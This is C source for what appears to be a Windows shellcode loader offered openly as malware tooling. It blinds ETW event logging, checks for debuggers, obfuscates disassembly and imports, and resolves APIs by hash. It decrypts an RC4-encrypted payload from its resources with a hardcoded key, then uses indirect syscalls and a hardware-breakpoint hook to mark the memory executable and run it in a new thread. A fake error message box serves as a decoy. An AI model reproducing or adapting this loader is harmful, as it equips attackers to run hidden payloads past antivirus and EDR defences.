#include "structs.h"
#include "debug/debug.h"

// Custom loader api function
#include "custom_loaderapi.h"

// Crypt
#include "encryption/rc4.h"

// Anti-XXXX functions
#include "anti-analysis/anti-debug.h"
#include "anti-analysis/anti-disass.h"

// Indirect syscalls via tartarus gate
#include "indirect_syscall.h"

// Mutant creation
#include "mutex/mutex.h"

// ETW Bypassing
#include "ETW/etw.h"

// Include all typedefs and string hashes
#include "typedefs.h"

// Helper functions
#include "helper_functions.h"

// Exception handler
#include "hooks/exception_handler.h"

// Hardware Breakpoints
#include "hooks/hwbp.h"

// Hook functions
#include "hooks/hook_functions.h"

// IAT camoflage
#include "IAT/iat_camoflage.h"

// include the resource (shellcode)
#include "resource.h"

#define ERR -0x1
#define SUCCESS 0x0

BOOL InitializeNtSyscalls();
int _TIGER(HANDLE hMutant, PVOID Handler);

// Global Variable
NTAPI_FUNC _G_NTFUNC = { 0 };

// RCX execution
LPVOID RtlCallFunction(LPVOID lpparam) {
	(*(LPVOID(WINAPI*)())(lpparam))();
	return 0;
}

//int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow){
int main(void) {
	if (DisableETW(ETWEVENTWRITE_HASH) == FALSE || DisableETW(ETWEVENTWRITEFULL_HASH) == FALSE) {
		return -1;
	}

#ifdef DEBUG
	PRINTA("\n[+] Bypassed ETW Successfully !\n\n");
#endif

	NTSTATUS STATUS = NULL;
	WCHAR MUTANTNAME[] = { '\\','B','a','s','e','N','a','m','e','d','O','b','j','e','c','t','s','\\','S','M','0',':','4','2','1','2',':','T','I','G','1','2','0',':','W','i','l','E','r','r','o','r','_','0','3', 0x0 };
	BOOL debugged = FALSE;
	BOOL MutexRes = FALSE;

	// example: -10000000 = 1sec relative to current :)
	// Used by NtDelayExecution()
	LONGLONG sleepTimer = WAITTIMER;

	// Anti-Disassembly
	AntiDisassmConstantCondition();
	AntiDisassmAsmJmpSameTarget();
	AntiDisassmImpossibleDiasassm();

	HANDLE hMutant = _CreateMutant(MUTANTNAME);
	if (hMutant == NULL) {
		return -1;
	}

	// Increase the number for longer operation
	// defined MPL0 in typedef.h
	for (int i = 0; i < MLP0; i++) {
		camoflage_IAT();
	}

	if (AntiDebugPEBCheck() != FALSE) {

#ifdef DEBUG
		PRINTA("[-] Debugging check (PEB) -> FAILED\n");
#endif

		debugged = TRUE;
	}

	if (NtGlobalFlagCheck() != FALSE) {

#ifdef DEBUG
		PRINTA("[-] Debugging check (NtGlobalFlags) -> FAILED\n");
#endif
		debugged = TRUE;
	}

	if (DelayExecution(sleepTimer) == FALSE) { 
#ifdef DEBUG
		PRINTA("[-] Debugging check (NtDelayExecution) -> FAILED\n");
#endif
		debugged = TRUE;
	}

	if (debugged == TRUE) {
#ifdef DEBUG
		PRINTA("[-] Debugger attached\n");
#endif

		return -1;
	}
	

#ifdef DEBUG
	PRINTA("[+] Debugger checks -> PASS\n");
#endif

	t_RtlAddVectoredExceptionHandler RtlAddVectoredExceptionHandler = 
		(t_RtlAddVectoredExceptionHandler)_GetProcAddress(_GetModuleHandle(NTDLL_HASH), RTLADDVECTOREDEXCEPTIONHANDLER_HASH);

	SET_HANDLERINFO((DWORD64)&MessageBoxA, (DWORD64)&hook_MessageBox);
	PVOID pEhandler = RtlAddVectoredExceptionHandler(1, &e_handler);

#ifdef DEBUG
	//PRINTA("Vectored Handler result: 0x%p\n", pEhandler);
#endif

	if (pEhandler == NULL) {
		return -1;
	}

	_TIGER(hMutant, pEhandler);

	return SUCCESS;
}

// Populate the NTAPI_FUNC->NTSYSAPI structure with information about a syscall
BOOL InitializeNtSyscalls() {

	if (!ObtainSyscall(NTALLOCATEVIRTUALMEMORY_HASH, &_G_NTFUNC.NtAllocateVirtualMemory)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", _G_NTFUNC.NtAllocateVirtualMemory.dwSSN, _G_NTFUNC.NtAllocateVirtualMemory.pRandSyscallAddress);
#endif

	if (!ObtainSyscall(NTPROTECTVIRTUALMEMORY_HASH, &_G_NTFUNC.NtProtectVirtualMemory)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", _G_NTFUNC.NtProtectVirtualMemory.dwSSN, _G_NTFUNC.NtProtectVirtualMemory.pRandSyscallAddress);
#endif
	if (!ObtainSyscall(NTCREATETHREADEX_HASH, &_G_NTFUNC.NtCreateThreadEx)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", _G_NTFUNC.NtCreateThreadEx.dwSSN, _G_NTFUNC.NtCreateThreadEx.pRandSyscallAddress);
#endif
	if (!ObtainSyscall(NTWAITFORSINGLEOBJECT_HASH, &_G_NTFUNC.NtWaitForSingleObject)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", _G_NTFUNC.NtWaitForSingleObject.dwSSN, _G_NTFUNC.NtWaitForSingleObject.pRandSyscallAddress);
#endif
	return TRUE;
}

int _TIGER(HANDLE hMutant, PVOID Handler) {

	t_FindResourceW FindResourceW		= (t_FindResourceW)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), FINDRESOURCEW_HASH);
	t_LoadResource LoadResource			= (t_LoadResource)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), LOADRESOURCE_HASH);
	t_LockResource LockResource			= (t_LockResource)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), LOCKRESOURCE_HASH);
	t_SizeofResource SizeofResource		= (t_SizeofResource)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), SIZEOFRESOURCE_HASH);
	t_FreeResource FreeResource			= (t_FreeResource)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), FREERESOURCE_HASH);
	t_RtlSecureZeroMemory RtlSecureZeroMemory = 
		(t_RtlSecureZeroMemory)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), RTLSECUREZEROMEMORY_HASH);

	t_RtlRemoveVectoredExceptionHandler RtlRemoveVectoredExceptionHandler = 
		(t_RtlRemoveVectoredExceptionHandler)_GetProcAddress(_GetModuleHandle(NTDLL_HASH), RTLREMOVEVECTOREDEXCEPTIONHANDLER_HASH);

	// Get the shellcode from resource (.rsrc)
	HRSRC res = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_SCODE1), RT_RCDATA);
	HGLOBAL resHandle = LoadResource(NULL, res);
	unsigned char* payload = (unsigned char*)LockResource(resHandle);
	SIZE_T sSize = SizeofResource(NULL, res);

	//---------------------------------------

	NTSTATUS	STATUS = NULL;
	PVOID		pAddress = NULL;
	DWORD		dwOld = NULL;
	HANDLE		hProcess = NtCurrentProcess(),	// local process
				hThread = NULL;

	PRINTA("Resource ADDR: %#p\n", res);

	const char key[] = { 'X','@','f','8','k','d','3','T','D','o','!','r','j','E' };
	SIZE_T sizeKey = sizeof(key);

	// initializing the used syscalls
	if (!InitializeNtSyscalls()) {
#ifdef DEBUG
		PRINTA("[!] Failed To Initialize The Specified Indirect Syscalls \n");
#endif
		return -1;
	}

	// allocating memory
	SET_SYSCALL(_G_NTFUNC.NtAllocateVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddress, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddress == NULL) {
#ifdef DEBUG
		PRINTA("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
#endif
		return -1;
	}

	SET_SCADDRESS(hProcess, pAddress, sSize, dwOld);

	// copying the payload
	if (ZwMoveMemory(pAddress, payload, sSize) != NULL) {
#ifdef DEBUG
		PRINTA("[+] Memory moved ! (ADDR: 0x%p)\n", pAddress);
#endif

		if ((STATUS = CryptMemory032(pAddress, sSize, key, sizeKey)) != 0x00) {
#ifdef DEBUG
			PRINTA("[-] Decryption Failed ! (STATUS 0x%0.8X)\n", STATUS);
#endif
			return -1;
		}

#ifdef DEBUG
		PRINTA("[+] Memory decrypted successfully !\n");
#endif

		// Setting HWBP
		HWBP(NtCurrentThread(), (DWORD64)&MessageBoxA, TRUE);

		// Call MessageBoxA and protect the shellcode memory block
		MessageBoxA(NULL, "Unexpected behaviour!", "Error", 0x00000010L);

		RtlRemoveVectoredExceptionHandler(Handler);

	}
	else {
		return -1;
	}

	// changing memory protection
	SET_SYSCALL(_G_NTFUNC.NtProtectVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddress, &sSize, PAGE_EXECUTE_READ, &dwOld)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
#endif
		return -1;
	}


	// executing the payload
	SET_SYSCALL(_G_NTFUNC.NtCreateThreadEx);
	if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, RtlCallFunction, pAddress, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n", STATUS);
#endif
		return -1;
	}

	// waiting for the payload
	SET_SYSCALL(_G_NTFUNC.NtWaitForSingleObject);
	if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
#endif
		return -1;
	}

	// Free the .rsrc section with the shellcode
	RtlSecureZeroMemory(payload, sSize);
	FreeResource(res);

	BOOL MutantRes = _DestroyMutant(hMutant);
	if (MutantRes != TRUE) {
		return -1;
	}
}